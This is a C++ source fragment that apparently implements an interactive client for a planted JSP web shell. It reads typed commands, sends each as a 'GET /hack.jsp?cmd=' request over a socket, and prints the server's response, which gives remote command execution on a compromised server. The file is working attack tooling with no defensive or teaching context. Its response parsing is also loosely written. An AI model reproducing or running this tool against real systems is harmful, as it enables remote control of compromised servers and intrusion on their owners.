#include "hdr.h"

string replaceAll(string s, string ss1, string ss2) {
    int pos;
    while ((pos = s.find(ss1)) != -1) {
        s.replace(pos, 1, ss2);
    }
    return s;
}

void telnet(SOCKET sock, char* buf) {
    char sendbuf[100];
    while (1) {
        ZeroMemory(sendbuf, 100);

        string cmd;
        DWORD bytes;

        cout << "$ ";
        cin.getline(sendbuf, 100);
        cout << endl;

        string request = "GET /hack.jsp?cmd=" + replaceAll(string(sendbuf), " ", "+") + " HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n";
        send(sock, request.c_str(), request.length(), NULL);

        while ((bytes = recv(sock, buf, 500, NULL)) > 0) {
            int dlen = bytes - (string(buf).find("\r\n\r\n") + 4);
            cout << string(buf).substr(string(buf).find("\r\n\r\n") + 4, dlen);
            if (dlen != 0 && bytes != 500) {
                break;
            }
        }

        cout << endl;
    }
}